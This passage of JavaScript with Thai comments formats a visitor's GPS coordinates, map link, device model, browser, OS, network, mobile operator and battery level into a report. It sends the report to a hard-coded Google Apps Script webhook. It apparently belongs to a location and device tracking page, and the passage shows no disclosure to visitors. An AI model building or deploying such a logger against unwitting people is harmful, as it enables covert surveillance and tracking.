  if (location && location !== "ไม่มีข้อมูล" && location.lat && location.long) {
    message.push(`📍พิกัด GPS: ${location.lat}, ${location.long} (แม่นยำ ±${Math.round(location.accuracy)}m)`);
    message.push(`🗺️ลิงก์แผนที่: ${location.gmapLink}`);
  } else {
    message.push(`📍พิกัด GPS: ไม่สามารถระบุได้ (ผู้ใช้ไม่อนุญาต)`);
  }

  // ข้อมูลอุปกรณ์
  message.push(`📱อุปกรณ์: ${deviceData.deviceType} - ${deviceData.deviceModel}`);
  message.push(`🌐เบราว์เซอร์: ${deviceData.browser}`);

  // ข้อมูลหน้าจอ
  message.push(`📊ขนาดหน้าจอ: ${deviceData.screenSize} (${deviceData.screenColorDepth}bit, x${deviceData.devicePixelRatio})`);

  // ข้อมูลระบบ
  message.push(`🖥️ระบบปฏิบัติการ: ${deviceData.platform}`);
  message.push(`🔤ภาษา: ${deviceData.language}`);

  // ข้อมูลการเชื่อมต่อ (เพิ่มเติม)
  if (typeof deviceData.connection === 'object') {
    // แสดงประเภทการเชื่อมต่อ (WiFi หรือ Mobile)
    const networkTypeIcon = deviceData.connection.isWifi ? "📶" : "📱";
    const networkType = deviceData.connection.networkType;
    message.push(`${networkTypeIcon}การเชื่อมต่อ: ${networkType} (${deviceData.connection.effectiveType})`);
    message.push(`⚡ความเร็วโดยประมาณ: ${deviceData.connection.downlink} Mbps (RTT: ${deviceData.connection.rtt}ms)`);

    // ถ้าเป็น Mobile ให้แสดงข้อมูลเพิ่มเติม
    if (deviceData.connection.isMobile && phoneInfo) {
      message.push(`📞เครือข่ายมือถือ: ${phoneInfo.possibleOperator}`);
      if (phoneInfo.countryCode !== "ไม่สามารถระบุได้") {
        message.push(`🏴รหัสประเทศ: ${phoneInfo.countryCode}`);
      }
      message.push(`📝หมายเหตุ: ${phoneInfo.remarks}`);
    }
  }

  // ข้อมูลแบตเตอรี่
  if (typeof deviceData.battery === 'object') {
    message.push(`🔋แบตเตอรี่: ${deviceData.battery.level} (${deviceData.battery.charging})`);
  }

  return message.join("\n");
}

// ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
function sendToLineNotify(dataToSend) {
  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzkWbVTjGCNfq7aGjaRXx4r_u5GV-eI2J1f07V_2G0rCWMiLakp61gAC7OCPPv55GGx/exec';

  // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
  if (!dataToSend.requestId) {
    dataToSend.requestId = generateUniqueId();
  }
  
  // ใช้ sessionStorage เพื่อป้องกันการส่งซ้ำในวินโดว์เดียวกัน
  const sentRequests = JSON.parse(sessionStorage.getItem('sentRequests') || '[]');
  if (sentRequests.includes(dataToSend.requestId)) {
    console.log("ข้อมูลนี้เคยส่งแล้ว (requestId: " + dataToSend.requestId + ")");
    return;
  }
  
  console.log("กำลังส่งข้อมูลไป webhook (requestId: " + dataToSend.requestId + ")");

  // ส่งข้อมูล
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(dataToSend),
    mode: 'no-cors'
  })
  .then(() => {
    console.log("ส่งข้อมูลไปยัง Server สำเร็จ");
    
    // บันทึก requestId ที่ส่งสำเร็จแล้ว
    sentRequests.push(dataToSend.requestId);
    sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
  })
  .catch(error => {
    console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
  });
}

// สร้าง unique ID สำหรับแต่ละการร้องขอ1
function generateUniqueId() {
  return Date.now().toString(36) + Math.random().toString(36).substring(2, 10);
}
